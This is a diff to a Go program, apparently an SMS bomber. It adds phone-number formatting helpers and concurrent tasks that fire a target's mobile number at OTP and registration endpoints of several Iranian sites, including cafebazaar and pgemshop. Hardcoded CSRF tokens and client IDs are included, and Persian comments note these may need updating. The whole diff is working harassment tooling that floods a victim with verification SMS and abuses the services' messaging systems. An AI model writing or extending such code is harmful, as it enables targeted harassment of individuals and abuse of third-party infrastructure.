@@ -176,7 +176,21 @@ func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *s
 		return 
 	}
 }
+// توابع کمکی برای فرمت کردن شماره تلفن (برای استفاده داخلی در task ها)
+func getPhoneNumberNoZero(phone string) string {
+	if strings.HasPrefix(phone, "0") {
+		return phone[1:]
+	}
+	return phone
+}
 
+func getPhoneNumber98NoZero(phone string) string {
+	return "98" + getPhoneNumberNoZero(phone)
+}
+
+func getPhoneNumberPlus98NoZero(phone string) string {
+	return "+98" + getPhoneNumberNoZero(phone)
+}
 func main() {
 	clearScreen()
 
@@ -286,10 +300,49 @@ func main() {
 		
 
 
-
-
-
-
+			// core-api.mayava.ir (POST JSON)
+			wg.Add(1)
+			tasks <- func() {
+				payload := map[string]interface{}{
+					"mobile": phone, // شماره کامل
+				}
+				sendJSONRequest(ctx, "https://core-api.mayava.ir/auth/check", payload, &wg, ch)
+			}
+			// pgemshop.com (POST Form)
+			wg.Add(1)
+			tasks <- func() {
+				formData := url.Values{}
+				formData.Set("action", "digits_check_mob")
+				formData.Set("countrycode", "+98")
+				formData.Set("mobileNo", phone) // شماره کامل
+				formData.Set("csrf", "0a60a620d9") // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
+				formData.Set("login", "2")
+				formData.Set("username", "")
+				formData.Set("email", "")
+				formData.Set("captcha", "")
+				formData.Set("captcha_ses", "")
+				formData.Set("json", "1")
+				formData.Set("whatsapp", "0")
+				sendFormRequest(ctx, "https://pgemshop.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+			// api.cafebazaar.ir (POST JSON)
+			wg.Add(1)
+			tasks <- func() {
+				payload := map[string]interface{}{
+					"properties": map[string]interface{}{
+						"language":      2,
+						"clientID":      "56uuqlpkg8ac0obfqk09jtoylc7grssx", // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
+						"clientVersion": "web",                          // مقدار ثابت
+						"deviceID":      "56uuqlpkg8ac0obfqk09jtoylc7grssx", // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
+					},
+					"singleRequest": map[string]interface{}{
+						"getOtpTokenRequest": map[string]interface{}{
+							"username": getPhoneNumber98NoZero(phone), // 98 + شماره بدون صفر اول
+						},
+					},
+				}
+				sendJSONRequest(ctx, "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest", payload, &wg, ch)
+			}
      // harikashop.com - register (ثبت نام - شامل پارامترهای دینامیک و فیلدهای بیشتر)
     wg.Add(1)
     tasks <- func() {
